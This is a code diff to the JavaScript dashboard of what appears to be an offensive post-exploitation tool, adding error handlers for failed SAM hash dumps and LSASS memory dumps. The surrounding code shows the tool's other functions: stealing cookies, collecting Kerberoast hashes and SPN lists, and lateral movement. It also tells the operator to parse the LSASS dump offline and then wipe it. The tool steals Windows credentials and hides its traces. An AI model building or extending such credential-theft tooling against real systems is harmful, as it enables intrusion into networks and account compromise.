@@ -863,10 +863,12 @@
                     if (d.type === 'cookies_done') { window._renderCookies(window._cookiesData); window._cookiesData = []; }
                     if (d.type === 'sam_chunk') { window._samData = window._samData.concat(d.entries); window.log('SAM chunk: ' + d.entries.length + ' entries', 'INFO'); }
                     if (d.type === 'sam_done') { window._renderSAM(window._samData); window._samData = []; }
+                    if (d.type === 'sam_error') { window._samData = []; if (window._renderSAMError) window._renderSAMError(d.error || 'unknown error'); }
                     if (d.type === 'roast_hash') { window._roastData.push(d); window.log('Roast hash: ' + (d.spn || d.user) + ' [' + d.kind + ']', 'INFO'); }
                     if (d.type === 'roast_done') { window._renderRoast(window._roastData); window._roastData = []; }
                     if (d.type === 'spn_list') { window._renderSPN(d.entries || []); }
                     if (d.type === 'lsass_done') { window._renderLSASS(d); }
+                    if (d.type === 'lsass_error') { if (window._renderLSASSError) window._renderLSASSError(d.error || 'unknown error'); }
                     if (d.type === 'lateral_done') { window._renderLateral(d); }
                 };
             } catch(e) {
@@ -1065,11 +1067,19 @@
             window._renderSAM = function(d) {
                 const body = document.getElementById('intel-body');
                 body.innerHTML = '';
-                if (d.length === 0) body.innerHTML = '<tr class="empty-row"><td colspan="4" style="color:var(--red);">No SAM material (needs elevation or remote registry unavailable).</td></tr>';
+                if (d.length === 0) body.innerHTML = '<tr class="empty-row"><td colspan="4" style="color:var(--red);">SAM dump returned no accounts.</td></tr>';
                 for (const e of d) {
                     body.innerHTML += `<tr><td style="font-family:var(--mono); color:var(--accent);">${window.esc(e.rid)}</td><td style="font-weight:600;">${window.esc(e.user)}</td><td style="font-family:var(--mono); font-size:11px; color:var(--dim);">${window.esc(e.lm)}</td><td style="font-family:var(--mono); font-size:11px; color:var(--amber);">${window.esc(e.nt)}</td></tr>`;
                 }
                 window.log('SAM dump done: ' + d.length + ' accounts', 'SUCCESS');
+            };
+            // Raised by the server's sam_error event when DumpSAM fails. The real
+            // cause is shown instead of the old catch-all "needs elevation" text,
+            // which lied whenever the token was already elevated.
+            window._renderSAMError = function(msg) {
+                const body = document.getElementById('intel-body');
+                if (body) body.innerHTML = `<tr class="empty-row"><td colspan="4" style="color:var(--red);">SAM dump failed: ${window.esc(msg)}</td></tr>`;
+                window.log('SAM dump failed: ' + msg, 'ERROR');
             };
             try {
                 await window.req('/v1/sys/sam', {method:'POST'});
@@ -1225,6 +1235,14 @@
                 window.toast('LSASS minidump ready — parse offline, then wipe', 'SUCCESS');
                 window.log('LSASS dump: ' + d.path + ' (' + d.size + ' bytes)', 'SUCCESS');
             };
+            // Raised by the server's lsass_error event. Previously a failed dump
+            // emitted nothing at all, so the dashboard waited forever for a
+            // lsass_done that never arrived.
+            window._renderLSASSError = function(msg) {
+                document.getElementById('sig-status').innerText = '[LSASS_FAILED]';
+                window.toast('LSASS dump failed: ' + msg, 'ERROR');
+                window.log('LSASS dump failed: ' + msg, 'ERROR');
+            };
             window.req('/v1/op/lsass', {
                 method:'POST', headers:{'Content-Type':'application/json'},
                 body: JSON.stringify({pid: pid}),
@@ -1242,6 +1260,10 @@
                 window._lsassPath = d.path || '';
                 document.getElementById('sig-status').innerText = '[LSASS_DUMPED > ' + d.path + ' (' + d.size + ' bytes)]';
                 window.log('LSASS dump: ' + d.path + ' (' + d.size + ' bytes)', 'SUCCESS');
+            };
+            window._renderLSASSError = function(msg) {
+                document.getElementById('sig-status').innerText = '[LSASS_FAILED]';
+                window.log('LSASS dump failed: ' + msg, 'ERROR');
             };
             try {
                 await window.req('/v1/op/lsass', {
